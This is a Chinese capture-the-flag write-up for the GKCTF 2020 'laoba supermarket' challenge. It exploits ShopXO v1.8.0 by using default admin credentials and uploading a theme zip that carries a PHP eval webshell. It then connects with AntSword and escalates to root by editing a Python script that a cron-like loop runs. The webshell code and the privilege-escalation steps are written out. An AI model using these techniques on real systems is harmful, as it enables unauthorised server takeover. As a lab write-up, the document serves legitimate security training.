## 基本信息

* 题目名称： [GKCTF 2020]老八小超市儿
* 题目链接： https://www.nssctf.cn/problem/1302
* 考点清单： shopxo框架漏洞
* 工具清单：无
* payloads： 无

## 一、看到什么

**题目关键信息列表**：

1. 打开题目就是`shopxo`安装向导`v1.8.0`

## 二、想到什么解题思路

1. 搜索`v1.8.0`版本的`shopxo`框架存在哪些漏洞并进行利用。

## 三、尝试过程和结果记录

**尝试过程：**

1. 同意协议，并点击下一步，输入数据库用户名和密码`root:root`，这个是靠自己猜测。数据库的管理员账户一般就是`root`。输入后验证成功，则会给出默认的后台地址`admin.php`和账户密码`admin:shopxo`。

2. 搜索版本漏洞，有一个[shopXO后台v1.8.0获取Shell复现](https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/ShopXO/ShopXO%20v1.8.0%20%E5%90%8E%E5%8F%B0getshell/)，可以跟着复现。

3. 登入后台 -> 打开主题管理，选择更多主题下载。

    ![](images/[GKCTF%202020]老八小超市儿-主题管理.png)

4. 注册一个账户，选择主题模板里的免费主题进行下载。

    ![](images/[GKCTF%202020]老八小超市儿-免费主题.png)

5. 它会给你一个网盘链接，下载好之后是`zip`安装包，任意选择一个版本的主题，写入一个如下内容的`php`文件。意图写入一句话木马，同时若访问这个文件则会显示当前`php`的配置信息。

    ```php
        <?php  
            eval($_POST["cmd"]);
            phpinfo(); 
        ?>    

    ```
6. 将这个文件命名为`1.php`，并放入如图所示的目录中，且任意版本的`zip`文件中都可以，比如`v6.0.0`。但是需要注意的是压缩包的目录结构不能发生变化，如直接对默认主题`v6.0.0`进行压缩，会导致压缩包多一级目录【默认主题`v6.0.0`】，这需要自己去检查一下。

    ![](images/[GKCTF%202020]老八小超市儿-目录结构.png)


6. 上传木马文件并利用就是要找到存储的位置。我们将重新压缩的压缩包进行上传。可以看到主题已经成功替换了，如果未替换则需要检查压缩时的目录是否多了一层。

    ![](images/[GKCTF%202020]老八小超市儿-主题路径.png)

7. 同时，我们也可以在源码中看到图片的路径，分析这个图片和`php`文件的相对位置，就知道其路径在`default/1.php`。进行访问。可以看到显示的就是`phpinfo()`的信息，表明木马上传成功，可以通过蚁剑连接了。

    ![](images/[GKCTF%202020]老八小超市儿-访问php文件.png)

8. 蚁剑连接，输入php文件中传递的参数`cmd`,链接地址选择`php`文件在服务器存储的位置。

9. 连接成功之后，直接访问根目录下的`flag`文件,提示这是假的，真的在`root`用户下。
    ![](images/[GKCTF%202020]老八小超市儿-假flag.png)

10. 根目录下还有`auto.sh`这个脚本文件，是一个定时任务,定时执行`makeflaghint.py`的内容，这里尝试直接更改脚本内容，提示保存失败，原因是权限不足，目前用户为`www-data`

    ```bash
    #!/bin/sh
    while true; do (python /var/mail/makeflaghint.py &) && sleep 60; done
    ```
11. 于是这里去访问`makeflaghint.py`,它会写入一些内容到`/flag.hint`中。这个`python`文件内容我们可以更改，于是在这里就可以获取`root`目录下的`flag`内容。增加下面注释的指令，就可以在`1.txt`中看到相关内容。

    ```python    
    import os
    import io
    import time
    os.system("whoami")
    gk1=str(time.ctime())
    gk="\nGet The RooT,The Date Is Useful!"
    f=io.open("/flag.hint", "rb+")
    f.write(str(gk1))
    f.write(str(gk))
    f.close()
    # os.system("cat /root/flag>/1.txt")
    ```
12. 等待`1min`左右，就可以在根目录下看到`1.txt`中包含`flag`了。

    ![](images/[GKCTF%202020]老八小超市儿-flag.png)


## 四、总结与反思

1. 框架漏洞可以对版本进行搜索并利用。
2. 定时任务也可以达到提权的效果。